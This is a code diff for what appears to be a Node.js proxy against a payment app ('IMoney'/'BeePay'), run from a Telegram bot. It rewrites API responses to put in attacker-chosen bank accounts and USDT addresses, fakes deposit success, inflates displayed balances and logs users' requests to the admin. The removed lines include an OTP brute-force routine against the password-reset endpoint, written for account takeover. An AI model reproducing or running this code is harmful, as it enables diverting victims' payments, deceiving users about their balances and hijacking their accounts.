+          if (!origVals[kl]) origVals[kl] = obj[key];
+          obj[key] = newVal;
         }
       }
     }
-
     if (typeof obj[key] === 'object' && obj[key] !== null) {
-      if (Array.isArray(obj[key])) {
-        obj[key].forEach(item => {
-          if (typeof item === 'object' && item !== null) deepReplaceBankDetails(item, active, originalValues, depth + 1);
-        });
-      } else {
-        deepReplaceBankDetails(obj[key], active, originalValues, depth + 1);
-      }
+      deepReplace(obj[key], bank, origVals, depth + 1);
     }
   }
+}
+
+function getResponseData(jsonResp) {
+  if (!jsonResp) return null;
+  if (jsonResp.data !== undefined) return jsonResp.data;
+  if (jsonResp.result !== undefined) return jsonResp.result;
+  return null;
 }
 
 function markDepositSuccess(obj) {
-  if (!obj) return;
-  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
-  if (obj.payStatus !== undefined) {
-    if (!failValues.includes(obj.payStatus)) {
-      obj.payStatus = 2;
+  if (!obj || typeof obj !== 'object') return;
+  const successStrings = ['success', 'completed', 'paid', 'confirmed'];
+  for (const key of Object.keys(obj)) {
+    const kl = key.toLowerCase();
+    if (kl.includes('status') || kl.includes('state')) {
+      const val = obj[key];
+      if (typeof val === 'number') obj[key] = 1;
+      else if (typeof val === 'string') obj[key] = 'success';
     }
-    return;
   }
-  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state'];
-  for (const field of statusFields) {
-    if (obj[field] !== undefined) {
-      if (failValues.includes(obj[field])) continue;
-      if (typeof obj[field] === 'number') {
-        obj[field] = 2;
-      } else if (typeof obj[field] === 'string') {
-        const num = parseInt(obj[field]);
-        if (!isNaN(num)) {
-          obj[field] = '2';
-        } else {
-          obj[field] = 'success';
-        }
+}
+
+function markReviewAsSuccess(obj) {
+  if (!obj || typeof obj !== 'object') return;
+  const reviewStrings = ['review', 'pending', 'processing', 'auditing', 'checking'];
+  for (const key of Object.keys(obj)) {
+    const kl = key.toLowerCase();
+    if (kl.includes('status') || kl.includes('state')) {
+      const val = obj[key];
+      if (typeof val === 'string' && reviewStrings.some(r => val.toLowerCase().includes(r))) {
+        obj[key] = 'SUCCESS';
       }
     }
   }
@@ -422,9 +518,11 @@ function markDepositSuccess(obj) {
 
 function addBonusToBalanceFields(obj, bonus) {
   if (!obj || typeof obj !== 'object') return;
-  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
+  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'amount'];
+  const skipKeys = ['availablewithdrawbalance', 'processwithdrawbalance', 'frozenbalance', 'freezebalance', 'withdrawbalance'];
   for (const key of Object.keys(obj)) {
-    if (balanceKeys.includes(key.toLowerCase())) {
+    const kl = key.toLowerCase();
+    if (balanceKeys.includes(kl) && !skipKeys.includes(kl)) {
       const current = parseFloat(obj[key]);
       if (!isNaN(current)) {
         obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
@@ -436,6 +534,110 @@ function addBonusToBalanceFields(obj, bonus) {
   }
 }
 
+function replaceUsdtInResponse(jsonResp, data) {
+  if (!data.usdtAddress || !jsonResp) return null;
+  const newAddr = data.usdtAddress;
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+  function scanAndReplace(obj, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 10) return '';
+    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
+    let oldAddr = '';
+    for (const key of Object.keys(obj)) {
+      const kl = key.toLowerCase();
+      if (typeof obj[key] === 'string') {
+        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'receiveaddress' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
+          if (obj[key].length >= 20 && obj[key] !== newAddr) { oldAddr = oldAddr || obj[key]; obj[key] = newAddr; }
+        }
+        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl') {
+          obj[key] = qrUrl;
+        }
+      } else if (typeof obj[key] === 'object') {
+        const found = scanAndReplace(obj[key], depth + 1);
+        if (found) oldAddr = oldAddr || found;
+      }
+    }
+    return oldAddr;
+  }
+  const rd = getResponseData(jsonResp);
+  if (rd) scanAndReplace(rd, 0);
+  else scanAndReplace(jsonResp, 0);
+  const fullStr = JSON.stringify(jsonResp);
+  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+  if (trcMatch) {
+    for (const addr of trcMatch) {
+      if (addr !== newAddr) {
+        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
+        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+      }
+    }
+  }
+  return { newAddr, qrUrl };
+}
+
+// ── Proxy fetch ───────────────────────────────────────────────────
+async function proxyFetch(req) {
+  const targetUrl = ORIGINAL_API + req.originalUrl;
+  const headers = {};
+  for (const [k, v] of Object.entries(req.headers || {})) {
+    const kl = k.toLowerCase();
+    if (kl === 'host') { headers['host'] = 'app-api.beepaycommon.com'; continue; }
+    if (kl === 'content-length' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+    headers[k] = v;
+  }
+  const opts = { method: req.method, headers };
+  if (req.rawBody && req.rawBody.length > 0) opts.body = req.rawBody;
+  const response = await fetch(targetUrl, opts);
+  const respBody = await response.arrayBuffer();
+  const respHeaders = {};
+  response.headers.forEach((v, k) => {
+    const kl = k.toLowerCase();
+    if (kl === 'content-encoding' || kl === 'transfer-encoding' || kl === 'connection') return;
+    respHeaders[k] = v;
+  });
+  let jsonResp = null;
+  try {
+    const text = Buffer.from(respBody).toString('utf-8');
+    jsonResp = JSON.parse(text);
+  } catch(e) {}
+  return { response, respBody: Buffer.from(respBody), respHeaders, jsonResp };
+}
+
+function sendJson(res, respHeaders, jsonResp, respBody) {
+  for (const [k, v] of Object.entries(respHeaders)) res.setHeader(k, v);
+  if (jsonResp) {
+    res.setHeader('content-type', 'application/json; charset=utf-8');
+    res.end(JSON.stringify(jsonResp));
+  } else {
+    res.end(respBody);
+  }
+}
+
+async function transparentProxy(req, res) {
+  try {
+    const { respBody, respHeaders } = await proxyFetch(req);
+    for (const [k, v] of Object.entries(respHeaders)) res.setHeader(k, v);
+    res.end(respBody);
+  } catch(e) {
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
+}
+
+// ── Request logger ────────────────────────────────────────────────
+app.use((req, res, next) => {
+  (async () => {
+    try {
+      if (!bot) return;
+      const data = cachedData || await loadData();
+      if (!data.logRequests || !data.adminChatId) return;
+      const path = req.originalUrl || req.url;
+      if (path.includes('bot-webhook') || path.includes('favicon') || path.includes('health')) return;
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}`).catch(()=>{});
+    } catch(e) {}
+  })();
+  next();
+});
+
+// ── Bot setup ─────────────────────────────────────────────────────
 app.get('/setup-webhook', async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
   try {
@@ -443,1235 +645,770 @@ app.get('/setup-webhook', async (req, res) => {
     webhookSet = true;
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook: info });
-  } catch (e) { res.json({ error: e.message }); }
+  } catch(e) { res.json({ error: e.message }); }
 });
 
-app.post('/api/telegram', async (req, res) => {
+app.get('/health', async (req, res) => {
+  let redisWorking = false;
+  if (redis) { try { await redis.ping(); redisWorking = true; } catch(e) {} }
+  const data = await loadData(true);
+  const active = getActiveBank(data, null);
+  res.json({
+    status: 'ok', app: 'BeePay Proxy',
+    redis: redis ? (redisWorking ? 'connected' : 'error') : 'not configured',
+    bankActive: !!active, totalBanks: data.banks.length, adminSet: !!data.adminChatId
+  });
+});
+
+// ── Telegram bot commands ─────────────────────────────────────────
+app.post('/bot-webhook', async (req, res) => {
   try {
     await ensureWebhook();
     if (!bot) return res.sendStatus(200);
-
     const msg = req.parsedBody?.message;
     if (!msg || !msg.text) return res.sendStatus(200);
-
     const chatId = msg.chat.id;
     const text = msg.text.trim();
-    let bankData = await loadData();
+    let data = await loadData(true);
 
     if (text === '/start') {
-      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
+      if (data.adminChatId && data.adminChatId !== chatId) {
         await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
         return res.sendStatus(200);
       }
-      bankData.adminChatId = chatId;
-      if (bankData.botEnabled === undefined) bankData.botEnabled = true;
-      if (bankData.autoRotate === undefined) bankData.autoRotate = false;
-      await saveData(bankData);
+      data.adminChatId = chatId;
+      data._skipOverrideMerge = true;
+      await saveData(data);
       await bot.sendMessage(chatId,
-`🏦 IMoney Bank Controller
+`🐝 BeePay Bank Controller
 
-=== GLOBAL COMMANDS ===
-/addbank <AccNo> | <Name> | <IFSC>
+=== BANK COMMANDS ===
+/addbank Name|AccNo|IFSC|BankName|UPI [minAmount]
+/setmin <bankNumber> <amount>
 /removebank <number>
-/usebank <number>
-/deactivate
-/list
-/status
+/setbank <number>
+/banks — List all banks
 
-/on - Bot ON
-/off - Bot OFF
+=== CONTROL ===
+/on — Proxy ON
+/off — Proxy OFF
+/rotate — Toggle auto-rotate
+/log — Toggle request logging
+/status — Full status
+/debug — Debug next response
 
-/rotate on/off - Auto rotate banks
-/deposit on <amount> - ALL users deposit success
-/deposit off - ALL users normal
+=== BALANCE ===
+/add <amount> <userId>
+/deduct <amount> <userId>
+/remove balance <userId>
+/history [userId]
+/clearhistory
 
-=== WITHDRAW COMMANDS ===
-/on withdraw <count> - Last N orders → Paying (all users)
-/on withdraw <count> <userId> - Last N orders → Paying (specific user)
-/off withdraw - Restore global override
-/off withdraw <userId> - Restore specific user
+=== USDT ===
+/usdt <address>
+/usdt off
 
-=== USDT COMMANDS ===
-/setusdt <address> - Set custom USDT TRC20 address
-/setusdt off - Disable USDT override
+=== ACTIVE LOGIN ===
+/active <phone>
+/active off <phone>
+/active list
+/otp [code]
 
-=== LOG COMMANDS ===
-/log on - Log all API requests to Telegram
-/log off - Stop logging
-
-=== PER-ID COMMANDS ===
-/id deposit on <amount> <userId>
-/id deposit off <userId>
-/id bank <bankNumber> <userId>
-/id on <userId>
-/id off <userId>
-/id status <userId>
-/id reset <userId>
-/id list - Show all user overrides
+=== TRACKING ===
+/idtrack — Show tracked users
 
 Example:
-/addbank 1234567890 | Rahul Kumar | SBIN0001234
-/id deposit on 5000 28963
-/id bank 2 28963`
+/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
+      return res.sendStatus(200);
     }
 
-    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
+    if (data.adminChatId && chatId !== data.adminChatId) {
       await bot.sendMessage(chatId, '❌ Unauthorized.');
       return res.sendStatus(200);
     }
 
-    else if (text.startsWith('/id ')) {
-      const idCmd = text.substring(4).trim();
-
-      if (idCmd === 'list') {
-        const overrides = bankData.userOverrides || {};
-        const ids = Object.keys(overrides);
-        if (ids.length === 0) {
-          await bot.sendMessage(chatId, '📋 No per-ID overrides set.\nUse /id track to see detected users.');
-        } else {
-          let msg = '📋 Per-ID Overrides:\n\n';
-          for (const uid of ids) {
-            const uo = overrides[uid];
-            const parts = [];
-            if (uo.botEnabled !== undefined) parts.push(uo.botEnabled ? '🟢 ON' : '🔴 OFF');
-            if (uo.depositSuccess !== undefined) parts.push(uo.depositSuccess ? '✅ Deposit ON (₹' + (uo.depositBonus || 0) + ')' : '🔴 Deposit OFF');
-            if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
-            msg += `👤 ${uid}: ${parts.join(' | ')}\n`;
-          }
-          await bot.sendMessage(chatId, msg);
-        }
-        return res.sendStatus(200);
-      }
-
-      if (idCmd === 'track') {
-        const tracked = bankData.trackedUsers || {};
-        const ids = Object.keys(tracked);
-        if (ids.length === 0) {
-          await bot.sendMessage(chatId, '📋 No users detected yet.\nUsers will appear here when they make orders or UTR uploads.');
-        } else {
-          let msg = '📋 Detected Users:\n\n';
-          for (const uid of ids) {
-            const u = tracked[uid];
-            const hasOverride = bankData.userOverrides && bankData.userOverrides[uid] ? ' ⚙️' : '';
-            msg += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
-          }
-          msg += '⚙️ = has per-ID override\nUse /id status <userId> for details';
-          await bot.sendMessage(chatId, msg);
-        }
-        return res.sendStatus(200);
-      }
-
-      const depositOnMatch = idCmd.match(/^deposit on\s+(\d+(?:\.\d+)?)\s+(\d+)$/);
-      if (depositOnMatch) {
-        const amount = parseFloat(depositOnMatch[1]);
-        const userId = depositOnMatch[2];
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].depositSuccess = true;
-        bankData.userOverrides[userId].depositBonus = (bankData.userOverrides[userId].depositBonus || 0) + amount;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `✅ User ${userId}: Deposit SUCCESS ON\n💰 Bonus: ₹${bankData.userOverrides[userId].depositBonus}`);
-        return res.sendStatus(200);
-      }
-
-      const depositOffMatch = idCmd.match(/^deposit off\s+(\d+)$/);
-      if (depositOffMatch) {
-        const userId = depositOffMatch[1];
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].depositSuccess = false;
-        bankData.userOverrides[userId].depositBonus = 0;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `🔴 User ${userId}: Deposit OFF, bonus removed.`);
-        return res.sendStatus(200);
-      }
-
-      const bankMatch = idCmd.match(/^bank\s+(\d+)\s+(\d+)$/);
-      if (bankMatch) {
-        const bankNum = parseInt(bankMatch[1]);
-        const userId = bankMatch[2];
-        if (bankNum < 1 || bankNum > bankData.banks.length) {
-          await bot.sendMessage(chatId, `❌ Invalid bank number. /list se check karo.`);
-          return res.sendStatus(200);
-        }
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].bankIndex = bankNum - 1;
-        await saveData(bankData);
-        const bank = bankData.banks[bankNum - 1];
-        await bot.sendMessage(chatId, `✅ User ${userId}: Bank #${bankNum} set\n${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`);
-        return res.sendStatus(200);
-      }
-
-      const onMatch = idCmd.match(/^on\s+(\d+)$/);
-      if (onMatch) {
-        const userId = onMatch[1];
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].botEnabled = true;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `🟢 User ${userId}: Bot ON`);
-        return res.sendStatus(200);
-      }
-
-      const offMatch = idCmd.match(/^off\s+(\d+)$/);
-      if (offMatch) {
-        const userId = offMatch[1];
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].botEnabled = false;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `🔴 User ${userId}: Bot OFF`);
-        return res.sendStatus(200);
-      }
-
-      const statusMatch = idCmd.match(/^status\s+(\d+)$/);
-      if (statusMatch) {
-        const userId = statusMatch[1];
-        const uo = getUserOverride(bankData, userId);
-        const eff = getEffectiveSettings(bankData, userId);
-        let msg = `📊 User ${userId} Status:\n\n`;
-        if (!uo) {
-          msg += '(No overrides — using global settings)\n\n';
-        }
-        msg += `Bot: ${eff.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}${uo && uo.botEnabled !== undefined ? ' (per-ID)' : ' (global)'}\n`;
-        msg += `Deposit: ${eff.depositSuccess ? '✅ ON (₹' + eff.depositBonus + ')' : '🔴 OFF'}${uo && uo.depositSuccess !== undefined ? ' (per-ID)' : ' (global)'}\n`;
-        if (eff.bankOverride !== null && eff.bankOverride >= 0 && eff.bankOverride < bankData.banks.length) {
-          const b = bankData.banks[eff.bankOverride];
-          msg += `Bank: 🏦 #${eff.bankOverride + 1} ${b.accountHolder} | ${b.accountNo} (per-ID)\n`;
-        } else {
-          const active = getActiveBank(bankData, null);
-          msg += `Bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None'} (global)\n`;
-        }
-        const wc = uo && uo.withdrawCount ? uo.withdrawCount : 0;
-        msg += `Withdraw: ${wc > 0 ? '✅ First ' + wc + ' → Paying (per-ID)' : (bankData.withdrawOverride > 0 ? '✅ First ' + bankData.withdrawOverride + ' → Paying (global)' : '❌ OFF')}\n`;
-        await bot.sendMessage(chatId, msg);
-        return res.sendStatus(200);
-      }
-
-      const resetMatch = idCmd.match(/^reset\s+(\d+)$/);
-      if (resetMatch) {
-        const userId = resetMatch[1];
-        if (bankData.userOverrides && bankData.userOverrides[userId]) {
-          delete bankData.userOverrides[userId];
-          await saveData(bankData);
-          await bot.sendMessage(chatId, `🔄 User ${userId}: All overrides removed. Using global settings.`);
-        } else {
-          await bot.sendMessage(chatId, `ℹ️ User ${userId}: No overrides to reset.`);
-        }
-        return res.sendStatus(200);
-      }
-
-      await bot.sendMessage(chatId, `❌ Invalid /id command.\n\nUsage:\n/id deposit on <amount> <userId>\n/id deposit off <userId>\n/id bank <bankNum> <userId>\n/id on <userId>\n/id off <userId>\n/id status <userId>\n/id reset <userId>\n/id list`);
+    // /status
+    if (text === '/status') {
+      const active = getActiveBank(data, null);
+      const activeCount = Array.isArray(data.activePhones) ? data.activePhones.length : 0;
+      let m = `📊 BeePay Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\n🔄 Active Logins: ${activeCount}${activeCount > 0 ? ' (' + (data.activePhones || []).join(', ') + ')' : ''}`;
+      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
+      if (active) m += `\n\n💳 Active Bank:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
+      else m += '\n\n⚠️ No active bank';
+      await bot.sendMessage(chatId, m);
       return res.sendStatus(200);
     }
 
-    else if (text.match(/^\/on withdraw\s+/i)) {
-      const parts = text.replace(/^\/on withdraw\s+/i, '').trim().split(/\s+/);
-      const count = parseInt(parts[0]);
-      const userId = parts[1] || null;
-      if (isNaN(count) || count <= 0) {
-        await bot.sendMessage(chatId, '❌ Format: /on withdraw <count> [userId]\nExample: /on withdraw 2\nExample: /on withdraw 1 49740');
+    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
+    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON'); return res.sendStatus(200); }
+
+    // /banks
+    if (text === '/banks') {
+      data = await loadData(true);
+      await bot.sendMessage(chatId, bankListText(data));
+      return res.sendStatus(200);
+    }
+
+    // /addbank
+    if (text.startsWith('/addbank ')) {
+      const parts = text.substring(9).trim().split(/\s+/);
+      const bankStr = parts[0] || '';
+      const minAmount = parseFloat(parts[1]) || 0;
+      const bParts = bankStr.split('|');
+      if (bParts.length < 3) {
+        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI [minAmount]');
         return res.sendStatus(200);
       }
-      if (userId) {
-        if (!bankData.userOverrides) bankData.userOverrides = {};
-        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
-        bankData.userOverrides[userId].withdrawCount = count;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `✅ Withdraw override ON for user ${userId}\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw ${userId} to restore.`);
-      } else {
-        bankData.withdrawOverride = count;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `✅ Withdraw override ON (global)\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw to restore.`);
-      }
+      data = await loadData(true);
+      data.banks.push({
+        accountHolder: bParts[0] || '',
+        accountNo: bParts[1] || '',
+        ifsc: bParts[2] || '',
+        bankName: bParts[3] || '',
+        upiId: bParts[4] || '',
+        minAmount: minAmount
+      });
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Bank added!\n${bankListText(data)}`);
       return res.sendStatus(200);
     }
 
-    else if (text.match(/^\/off withdraw/i)) {
-      const userId = text.replace(/^\/off withdraw\s*/i, '').trim();
-      if (userId) {
-        if (bankData.userOverrides && bankData.userOverrides[userId] && bankData.userOverrides[userId].withdrawCount) {
-          const old = bankData.userOverrides[userId].withdrawCount;
-          delete bankData.userOverrides[userId].withdrawCount;
-          await saveData(bankData);
-          await bot.sendMessage(chatId, `🗑 Withdraw override OFF for user ${userId}\nWas: first ${old} order(s) → Paying`);
-        } else {
-          await bot.sendMessage(chatId, `ℹ️ No withdraw override for user ${userId}.`);
-        }
-      } else {
-        if (bankData.withdrawOverride) {
-          const old = bankData.withdrawOverride;
-          bankData.withdrawOverride = 0;
-          await saveData(bankData);
-          await bot.sendMessage(chatId, `🗑 Withdraw override OFF (global)\nWas: first ${old} order(s) → Paying`);
-        } else {
-          await bot.sendMessage(chatId, `ℹ️ Withdraw override is already OFF.`);
-        }
-      }
-      return res.sendStatus(200);
-    }
-
-    else if (text.trim() === '/log on') {
-      bankData.logRequests = true;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `📡 Request logging ON\nAll API requests will be logged to Telegram.\n\nUse /log off to stop.`);
-      return res.sendStatus(200);
-    }
-
-    else if (text.trim() === '/log off') {
-      bankData.logRequests = false;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `🔇 Request logging OFF`);
-      return res.sendStatus(200);
-    }
-
-    else if (text.startsWith('/setusdt ')) {
-      const arg = text.substring(9).trim();
-      if (arg.toLowerCase() === 'off') {
-        bankData.usdtAddress = '';
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `❌ USDT override OFF\nOriginal address will be shown.`);
-      } else if (arg.length >= 20) {
-        bankData.usdtAddress = arg;
-        await saveData(bankData);
-        await bot.sendMessage(chatId, `✅ USDT address set:\n${arg}\n\nAll USDT deposit pages will show this address + QR.\nUse /setusdt off to disable.`);
-      } else {
-        await bot.sendMessage(chatId, `❌ Invalid address. Must be 20+ chars.\nFormat: /setusdt <TRC20 address>`);
-      }
-      return res.sendStatus(200);
-    }
-
-    else if (text.startsWith('/bruteforce ')) {
-      const parts = text.substring(12).trim().split(/\s+/);
-      if (parts.length < 2) {
-        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [size]\nDefault: start 0, size 500\n\nExample:\n/bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 500`);
+    // /removebank
+    if (text.startsWith('/removebank ')) {
+      const idx = parseInt(text.substring(12).trim()) - 1;
+      data = await loadData(true);
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
+        await bot.sendMessage(chatId, '❌ Invalid bank number');
         return res.sendStatus(200);
       }
-      const phone = parts[0];
-      const newPass = parts[1];
-      const startFrom = parseInt(parts[2] || '0');
-      const totalSize = Math.min(parseInt(parts[3] || '500'), 1000);
-      const maxOtp = 9999;
-
-      function rHex(n) { let s=''; for(let i=0;i<n;i++) s+=Math.floor(Math.random()*16).toString(16); return s; }
-      function rUuid() { return [rHex(8),rHex(4),'4'+rHex(3),'a'+rHex(3),rHex(12)].join('-'); }
-
-      function makeAppHeaders() {
-        const ts = String(Date.now());
-        const deviceId = rHex(40);
-        const androidId = rHex(16);
-        return {
-          'accept-encoding': 'gzip',
-          'release': '16',
-          'device': deviceId,
-          'andid': androidId,
-          'versioncode': '80',
-          'token': '',
-          'serialnumber': 'qcom',
-          'content-type': 'application/x-www-form-urlencoded',
-          'networktype': 'TYPE_4G',
-          'model': androidId,
-          'user-agent': 'Dart/3.7 (dart:io)',
-          'accept': '*/*',
-          'timestamp': ts,
-          'auth': rHex(32),
-          'appuserid': rUuid(),
-          'uuid': rHex(24),
-          'host': 'api.i-money.vip'
-        };
-      }
-
-      const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
-      const startTime = Date.now();
-      const BATCH = 50;
-
-      let found = false;
-      let foundOtp = '';
-      let tried = 0;
-
-      for (let batchStart = startFrom; batchStart < startFrom + totalSize && batchStart <= maxOtp && !found; batchStart += BATCH) {
-        if (Date.now() - startTime > 8000) break;
-        const promises = [];
-        for (let i = batchStart; i < batchStart + BATCH && i <= maxOtp && i < startFrom + totalSize; i++) {
-          const otp = String(i).padStart(4, '0');
-          const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
-          const hdrs = makeAppHeaders();
-          hdrs['content-length'] = String(Buffer.byteLength(formBody));
-          promises.push(
-            fetch(ORIGINAL_API + '/user/forgetPass', {
-              method: 'POST',
-              headers: hdrs,
-              body: formBody
-            }).then(r => r.json()).then(result => {
-              tried++;
-              if (result.statusCode !== '1023') return { otp, result };
-              return null;
-            }).catch(() => null)
-          );
-        }
-        const results = await Promise.all(promises);
-        for (const r of results) {
-          if (r) { found = true; foundOtp = r.otp; break; }
-        }
-      }
-
-      if (found) {
-        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried`);
-      } else {
-        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        await bot.sendMessage(chatId, `❌ Not found (${tried} tried, ${elapsed}s)`);
-      }
+      const removed = data.banks.splice(idx, 1)[0];
+      if (data.activeIndex === idx) data.activeIndex = -1;
+      else if (data.activeIndex > idx) data.activeIndex--;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Removed: ${removed.accountHolder}\n${bankListText(data)}`);
       return res.sendStatus(200);
     }
 
-    else if (text.startsWith('/resetbrute ')) {
-      const brPhone = text.substring(12).trim();
-      try { await kv.del('bruteState_' + brPhone); } catch(e) {}
-      await bot.sendMessage(chatId, `🔄 Brute force state reset for ${brPhone}`);
+    // /setbank
+    if (text.startsWith('/setbank ')) {
+      const idx = parseInt(text.substring(9).trim()) - 1;
+      data = await loadData(true);
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
+        await bot.sendMessage(chatId, '❌ Invalid bank number');
+        return res.sendStatus(200);
+      }
+      data.activeIndex = idx;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const b = data.banks[idx];
+      await bot.sendMessage(chatId, `✅ Active Bank:\n${b.accountHolder}\n${b.accountNo}\n${b.ifsc}`);
       return res.sendStatus(200);
     }
 
-    else if (text.startsWith('/testotp ')) {
+    // /setmin
+    if (text.startsWith('/setmin ')) {
       const parts = text.substring(8).trim().split(/\s+/);
-      if (parts.length < 3) {
-        await bot.sendMessage(chatId, `Format: /testotp <phone> <password> <otp>`);
+      const idx = parseInt(parts[0]) - 1;
+      const amt = parseFloat(parts[1]) || 0;
+      data = await loadData(true);
+      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) {
+        await bot.sendMessage(chatId, '❌ Invalid bank number');
         return res.sendStatus(200);
       }
-      const [phone, newPass, otp] = parts;
-      const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+      data.banks[idx].minAmount = amt;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Bank ${idx + 1} min amount set to ₹${amt}\n${bankListText(data)}`);
+      return res.sendStatus(200);
+    }
 
-      const hdrs = savedForgetPassHeaders ? { ...savedForgetPassHeaders } : { 'host': 'api.i-money.vip' };
-      hdrs['content-type'] = 'application/x-www-form-urlencoded';
-      hdrs['content-length'] = String(Buffer.byteLength(formBody));
+    // /add balance
+    if (text.startsWith('/add ')) {
+      const parts = text.substring(5).trim().split(/\s+/);
+      const amount = parseFloat(parts[0]);
+      const targetUserId = parts[1] || '';
+      if (isNaN(amount) || !targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>');
+        return res.sendStatus(200);
+      }
+      const freshData = await loadData(true);
+      if (!freshData.userOverrides) freshData.userOverrides = {};
+      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
